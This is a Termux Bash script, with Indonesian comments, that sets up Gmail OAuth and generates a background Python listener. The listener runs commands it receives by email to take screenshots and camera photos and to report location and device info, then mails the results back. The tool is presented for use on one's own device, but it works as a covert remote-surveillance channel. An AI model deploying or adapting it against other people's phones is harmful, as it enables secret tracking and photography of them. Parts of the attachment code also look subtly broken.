#!/usr/bin/env bash

set -o pipefail
readonly G_CREDS_FILE="credentials.json"
readonly G_TOKEN_FILE="token.json"
readonly CONFIG_JSON_FILE="config.json"
readonly PY_HELPER_TOKEN="handle_token.py"
readonly PY_LISTENER="gmail_listener.py"
readonly CONFIG_DEVICE="device.conf"
readonly PID_FILE="listener.pid"
readonly LOG_FILE="listener.log"
readonly PATCH_FLAG=".patch_installed"
readonly DOWNLOAD_DIR="$HOME/storage/shared/Download"
readonly REDIRECT_URI="https://mawwscript.github.io/script/device/index.html"
# [FITUR BARU] URL untuk mengambil file konfigurasi Client ID
readonly CONFIG_URL="https://mawwscript.github.io/script/device/config.json"

# --- [ PALET WARNA & TAMPILAN ] ---
readonly C_RESET='\033[0m'; readonly C_RED='\033[0;31m'; readonly C_GREEN='\033[0;32m';
readonly C_YELLOW='\033[0;33m'; readonly C_BLUE='\033[0;34m'; readonly C_PURPLE='\033[0;35m';
readonly C_CYAN='\033[0;36m'; readonly C_WHITE='\033[1;37m'; readonly C_BOLD='\033[1m';
readonly C_DIM='\033[2m';

# --- [ FUNGSI LOGGING & UI HELPER (STABIL) ] ---
# [BUG FIX] Menghapus fungsi _prompt yang tidak stabil.
function _log_header() { echo -e "\n${C_CYAN}--- [ $@ ] ---${C_RESET}"; }
function _log_info() { echo -e "${C_WHITE}[i] $@${C_RESET}"; }
function _log_ok() { echo -e "${C_GREEN}[✔] $@${C_RESET}"; }
function _log_warn() { echo -e "${C_YELLOW}[!] $@${C_RESET}"; }
function _log_error() { echo -e "${C_RED}[✖] $@${C_RESET}"; }

# --- GENERATOR SCRIPT PYTHON (Tidak ada perubahan logika) ---
function _generate_py_scripts() {
source "$CONFIG_DEVICE"
cat << EOF > "$PY_HELPER_TOKEN"
import sys,os;from google_auth_oauthlib.flow import Flow
if len(sys.argv)<2:print("Penggunaan: python handle_token.py <auth_code>",file=sys.stderr);sys.exit(1)
auth_code=sys.argv[1];creds_file="$G_CREDS_FILE";token_file="$G_TOKEN_FILE";scopes=['https://www.googleapis.com/auth/gmail.modify']
redirect_uri="$REDIRECT_URI"
if not os.path.exists(creds_file):print(f"FATAL: File '{creds_file}' tidak ditemukan!",file=sys.stderr);sys.exit(1)
try:
    flow=Flow.from_client_secrets_file(creds_file,scopes,redirect_uri=redirect_uri);flow.fetch_token(code=auth_code)
    with open(token_file,'w') as token:token.write(flow.credentials.to_json())
    print(f"SUKSES: File '{token_file}' berhasil dibuat.")
except Exception as e:print(f"ERROR: Gagal menukar kode. Pastikan URI di Google Console benar. Detail: {e}",file=sys.stderr);sys.exit(1)
EOF
cat << EOF > "$PY_LISTENER"
import os,sys,subprocess,logging,base64,time;from google.oauth2.credentials import Credentials;from googleapiclient.discovery import build;from google.auth.transport.requests import Request;from email.mime.multipart import MIMEMultipart;from email.mime.text import MIMEText;from email.mime.base import MIMEBase;from email import encoders
SCOPES=['https://www.googleapis.com/auth/gmail.modify'];TOKEN_FILE='$G_TOKEN_FILE';MY_EMAIL='$MY_EMAIL';CMD_SUBJECT='$CMD_SUBJECT';LOG_FILE='$LOG_FILE';POLL_INTERVAL=180
logging.basicConfig(level=logging.INFO,filename=LOG_FILE,filemode='a',format='%(asctime)s - %(message)s')
def send_reply(service,original_message,body_text,attachment_path=None):
    try:
        headers=original_message['payload']['headers'];to_email=next(h['value'] for h in headers if h['name'].lower()=='from');subject="Re: "+next(h['value'] for h in headers if h['name'].lower()=='subject');message=MIMEMultipart();message['to']=to_email;message['subject']=subject;message.attach(MIMEText(body_text,'plain'))
        if attachment_path and os.path.exists(attachment_path):
            with open(attachment_path,'rb') as f:part=MIMEBase('application','octet-stream');part.set_payload(f.read())
            encoders.encode_base_64(part);part.add_header('Content-Disposition',f'attachment; filename="{os.path.basename(attachment_path)}"');message.attach(part)
        raw_message=base64.urlsafe_b64encode(message.as_bytes()).decode();service.users().messages().send(userId='me',body={'raw':raw_message}).execute();logging.info(f"Berhasil mengirim balasan ke {to_email}")
    except Exception as e:logging.error(f"Gagal mengirim balasan: {e}")
def execute_command(service,msg_obj,full_command):
    try:
        command=full_command.split(':')[1].strip().lower();logging.info(f"Mengeksekusi perintah: '{command}'");output_file,reply_body=None,f"Perintah '{command}' telah selesai dieksekusi."
        if command=='ss':output_file,reply_body=os.path.expanduser("~/screenshot.png"),"Screenshot terlampir.";subprocess.run(["termux-screenshot",output_file],timeout=20,check=True)
        elif command=='foto':output_file,reply_body=os.path.expanduser("~/photo.jpg"),"Foto terlampir.";subprocess.run(["termux-camera-photo","-c","0",output_file],timeout=25,check=True)
        elif command=='lokasi':result=subprocess.run(["termux-location"],capture_output=True,text=True,timeout=30,check=True);reply_body=f"Hasil perintah 'lokasi':\n\n{result.stdout or 'Tidak ada output.'}"
        elif command=='info':result=subprocess.run(["termux-device-info"],capture_output=True,text=True,timeout=15,check=True);reply_body=f"Info Perangkat:\n\n{result.stdout or 'Tidak ada output.'}"
        elif command=='exit-listener':reply_body="Perintah 'exit-listener' diterima. Listener akan berhenti.";send_reply(service,msg_obj,reply_body);logging.info("Listener dihentikan.");sys.exit(0)
        else:reply_body=f"Perintah '{command}' tidak dikenali."
        send_reply(service,msg_obj,reply_body,output_file)
    except Exception as e:logging.error(f"Error saat eksekusi: {e}");send_reply(service,msg_obj,f"GAGAL: Terjadi error. Cek log.")
    finally:
        if output_file and os.path.exists(output_file):os.remove(output_file)
def main_loop():
    creds=Credentials.from_authorized_user_file(TOKEN_FILE,SCOPES);service=build('gmail','v1',credentials=creds);logging.info("Listener service dimulai.");print("Listener kini berjalan di background...")
    while True:
        try:
            if not creds.valid:
                if creds.expired and creds.refresh_token:creds.refresh(Request())
                else:logging.error("Token tidak valid. Jalankan ulang setup.");sys.exit(1)
            q=f"from:{MY_EMAIL} is:unread subject:'{CMD_SUBJECT}'";results=service.users().messages().list(userId='me',labelIds=['INBOX'],q=q).execute();messages=results.get('messages',[])
            for message_info in messages:
                msg_id=message_info['id'];msg_obj=service.users().messages().get(userId='me',id=msg_id).execute()
                if msg_obj:execute_command(service,msg_obj,msg_obj['snippet'])
                service.users().messages().modify(userId='me',id=msg_id,body={'removeLabelIds':['UNREAD']}).execute()
            time.sleep(POLL_INTERVAL)
        except Exception as e:logging.error(f"Error pada loop utama: {e}");time.sleep(POLL_INTERVAL*2)
if __name__=='__main__':main_loop()
EOF
}

# --- LOGIKA INTI (dengan UI stabil & Arsitektur Baru) ---
# GANTI SEMUA FUNGSI SETUP LAMA DENGAN YANG INI
function setup() {
    clear; display_header
    _log_header "Setup / Konfigurasi Ulang (Mode Debug)"
    rm -f "$G_TOKEN_FILE"
    if [ ! -f "$CONFIG_DEVICE" ]; then
        _log_info "Membuat file '$CONFIG_DEVICE' baru..."
        read -r -p "$(echo -e "${C_CYAN}> Masukkan Alamat Email Gmail Anda: ${C_RESET}")" email_input
        read -r -p "$(echo -e "${C_CYAN}> Masukkan Subjek Perintah Rahasia: ${C_RESET}")" subject_input
        echo "MY_EMAIL=\"$email_input\"" > "$CONFIG_DEVICE"
        echo "CMD_SUBJECT=\"$subject_input\"" >> "$CONFIG_DEVICE"
        _log_ok "Konfigurasi dasar berhasil disimpan."
    fi
    source "$CONFIG_DEVICE"

    _log_info "Memeriksa file kredensial 'credentials.json'..."
    if [ ! -f "$G_CREDS_FILE" ]; then
        if ! cp "$DOWNLOAD_DIR/$G_CREDS_FILE" .; then
            _log_error "GAGAL: '$G_CREDS_FILE' tidak ada di folder Download."
            return
        fi
        _log_ok "Berhasil disalin dari folder Download."
    fi

    _log_info "Mengunduh konfigurasi Client ID dari URL..."
    if ! curl -sL -o "$CONFIG_JSON_FILE" "$CONFIG_URL"; then
        _log_error "GAGAL mengunduh config.json. Cek koneksi internet atau URL."
        return
    fi
    _log_ok "File '$CONFIG_JSON_FILE' berhasil diunduh."

    # --- [MATA-MATA DEBUGGING DIMULAI] ---
    echo -e "${C_YELLOW}-----------------------------------------------------"
    echo -e "--- ISI FILE CONFIG.JSON YANG DILIHAT SCRIPT ---"
    cat "$CONFIG_JSON_FILE"
    echo -e "\n-----------------------------------------------------${C_RESET}"
    # --- [MATA-MATA DEBUGGING SELESAI] ---

    _log_info "Membaca Client ID dari '$CONFIG_JSON_FILE'..."
    local client_id=$(grep -o '"CLIENT_ID": *"[^"]*"' "$CONFIG_JSON_FILE" | grep -o '"[^"]*"$' | tr -d '"')
    if [ -z "$client_id" ]; then
        _log_error "GAGAL: Tidak bisa membaca CLIENT_ID dari 'config.json'."
        _log_error "Pastikan format JSON benar dan file sudah diupload ke GitHub."
        return
    fi
    _log_ok "Client ID berhasil dibaca."

    _log_info "Membuat helper script Python..."
    _generate_py_scripts
    
    local scope="https://www.googleapis.com/auth/gmail.modify"
    local auth_url="https://accounts.google.com/o/oauth2/v2/auth?scope=${scope}&redirect_uri=${REDIRECT_URI}&response_type=code&client_id=${client_id}&access_type=offline&prompt=select_account"
    
    _log_info "Membuka browser untuk otentikasi..."
    am start -a android.intent.action.VIEW -d "$auth_url"
    
    _log_header "INSTRUKSI MANUAL"
    _log_warn "1. Selesaikan login & berikan izin di browser."
    _log_warn "2. Anda akan diarahkan ke halaman GitHub Pages."
    _log_warn "3. Salin kode yang ditampilkan di halaman itu."
    
    while true; do
        read -r -p "$(echo -e "${C_CYAN}> Paste kode di sini (atau 'q' untuk keluar): ${C_RESET}")" manual_code
        if [[ "$manual_code" == "q" ]]; then _log_info "Setup dibatalkan."; return; fi
        if [ -z "$manual_code" ]; then
            _log_error "Input kosong. Silakan paste kodenya."
            continue
        fi
        if python "$PY_HELPER_TOKEN" "$manual_code"; then break
        else _log_error "Kode salah atau tidak valid. Coba lagi."; fi
    done
    
    if [ -f "$G_TOKEN_FILE" ]; then
        _log_ok "🎉 SETUP SELESAI! Otorisasi berhasil."
    else
        _log_error "SETUP GAGAL. Coba periksa kembali semua langkah."
    fi
}

function start() { clear;display_header;_log_header "Memulai Listener"; if [ ! -f "$CONFIG_DEVICE" ]||[ ! -f "$G_TOKEN_FILE" ];then _log_error "Konfigurasi/token tidak ditemukan. Jalankan Setup!";return;fi;if [ -f "$PID_FILE" ]&&ps -p "$(cat "$PID_FILE")" >/dev/null;then _log_warn "Listener sudah berjalan.";return;fi;_generate_py_scripts;nohup python "$PY_LISTENER" >/dev/null 2>&1 & echo $! > "$PID_FILE";_log_ok "Listener dimulai (PID: $(cat "$PID_FILE")). Cek log di '$LOG_FILE'." ;}
function stop() { clear;display_header;_log_header "Menghentikan Listener"; if [ ! -f "$PID_FILE" ];then _log_warn "Listener tidak sedang berjalan.";return;fi;local pid=$(cat "$PID_FILE");if ps -p "$pid" >/dev/null;then kill "$pid";rm -f "$PID_FILE";_log_ok "Listener (PID: $pid) telah dihentikan.";else _log_warn "Proses (PID: $pid) tidak ditemukan. File PID dihapus.";rm -f "$PID_FILE";fi;}
function logs() { clear;display_header;_log_header "Melihat Log Realtime";if [ ! -f "$LOG_FILE" ];then _log_warn "File log belum ada.";return;fi;_log_info "Menampilkan log... Tekan ${C_BOLD}Ctrl+C${C_RESET} untuk keluar."; echo; tail -f "$LOG_FILE" ;}
function cleanup() { clear;display_header;_log_header "Pembersihan Total";_log_warn "Ini akan menghapus SEMUA file konfigurasi & token.";
    # [BUG FIX] Menggunakan read standar yang stabil
    read -r -p "$(echo -e "${C_YELLOW}> Anda yakin ingin melanjutkan? (y/n): ${C_RESET}")" confirm
    if [[ "$confirm" =~ ^[Yy]$ ]];then stop >/dev/null 2>&1||true;_log_info "Menghapus file...";rm -f "$CONFIG_DEVICE" "$G_TOKEN_FILE" "$G_CREDS_FILE" "$PY_HELPER_TOKEN" "$PY_LISTENER" ".patch_installed" "$LOG_FILE" "$PID_FILE" "$CONFIG_JSON_FILE";_log_ok "Pembersihan selesai.";else _log_info "Pembersihan dibatalkan.";fi;}
function run_patcher() { set -e;clear;display_header;_log_header "Persiapan Lingkungan Otomatis";
    # [PENAMBAHAN] curl ditambahkan sebagai dependensi
    readonly PKS=("python" "termux-api" "coreutils" "curl");
    readonly PYR=("google-api-python-client" "google-auth-httplib2" "google-auth-oauthlib");_log_info "${C_BOLD}Langkah 1/3:${C_RESET} Memeriksa paket sistem...";pkg update -y >/dev/null 2>&1;for p in "${PKS[@]}";do if ! dpkg -s "$p">/dev/null 2>&1;then _log_warn "Menginstal '$p'... (mungkin butuh waktu)";pkg install -y "$p";fi;done;_log_ok "Paket sistem siap.";_log_info "${C_BOLD}Langkah 2/3:${C_RESET} Memeriksa library Python...";for r in "${PYR[@]}";do if ! pip show "$r">/dev/null 2>&1;then _log_warn "Menginstal '$r'...";pip install --no-cache-dir "$r";fi;done;_log_ok "Library Python siap.";_log_info "${C_BOLD}Langkah 3/3:${C_RESET} Izin penyimpanan...";if [ ! -d "$HOME/storage/shared" ];then termux-setup-storage;_log_warn "Izin diminta, mohon konfirmasi...";sleep 5;fi;_log_ok "Izin penyimpanan siap.";echo;_log_ok "✅ LINGKUNGAN SUDAH SIAP! ✅";set +e;}

# --- [ FUNGSI TAMPILAN UTAMA (UI Stabil) ] ---
function display_header() {
    local status_text; local status_color; local pid_text=""
    if [ -f "$PID_FILE" ] && ps -p "$(cat "$PID_FILE")" >/dev/null; then
        status_text="A K T I F"; status_color="$C_GREEN"
        pid_text="(PID: $(cat "$PID_FILE"))"
    else
        status_text="TIDAK AKTIF"; status_color="$C_RED"
    fi
    echo -e "${C_PURPLE}-----------------------------------------------------${C_RESET}"
    echo -e "${C_BOLD}${C_WHITE} Maww-Script v25 (Refactored)${C_RESET}"
    echo -e "${C_PURPLE}-----------------------------------------------------${C_RESET}"
    printf "%-10s %-20s %s\n" " Status" ": ${status_color}${status_text}${C_RESET}" "${C_YELLOW}${pid_text}${C_RESET}"
    echo -e "${C_PURPLE}-----------------------------------------------------${C_RESET}"
}
function display_menu() {
    echo
    echo -e "${C_WHITE}  1) 🚀  Mulai Listener"
    echo -e "${C_WHITE}  2) 🛑  Hentikan Listener"
    echo -e "${C_WHITE}  3) ⚙️   Setup / Konfigurasi Ulang"
    echo -e "${C_WHITE}  4) 📜  Lihat Log Realtime"
    echo -e "${C_WHITE}  5) 🔧  Perbaiki Lingkungan"
    echo -e "${C_WHITE}  6) 🗑️   Hapus Semua Konfigurasi"
    echo -e "${C_WHITE}  7) 🚪  Keluar${C_RESET}"
    echo
    
    read -n 1 -p "$(echo -e "${C_CYAN}  Pilih Opsi [1-7] > ${C_RESET}")" choice
    echo
    case $choice in
        '1') start;; '2') stop;; '3') setup;; '4') logs;;
        '5') run_patcher; touch .patch_installed ;;
        '6') cleanup;;
        '7') echo -e "\n${C_PURPLE}Sampai jumpa lagi, Senpai!${C_RESET}"; exit 0;;
        *) echo -e "\n${C_RED}Pilihan tidak valid.${C_RESET}";;
    esac
    echo -e "\n${C_DIM}Tekan [Enter] untuk kembali ke menu...${C_RESET}"
    read -r
}

function main() {
    if [ ! -f ".patch_installed" ]; then
        clear; display_header
        _log_header "Selamat Datang di Maww Script!"
        _log_info "Ini eksekusi pertama, skrip akan menyiapkan lingkungan."
        _log_warn "Pastikan 'credentials.json' ada di folder Download."
        _log_warn "Pastikan juga 'config.json' sudah diupload ke GitHub Pages."
        read -p "   Tekan [Enter] untuk memulai persiapan..."
        run_patcher
        _log_info "Membuat file penanda penyelesaian..."
        touch .patch_installed
        _log_ok "Penanda '.patch_installed' berhasil dibuat."
        read -p "   Tekan [Enter] untuk lanjut ke menu utama..."
    fi
    while true; do
        clear
        display_header
        display_menu
    done
}

# --- [ MULAI EKSEKUSI ] ---
main
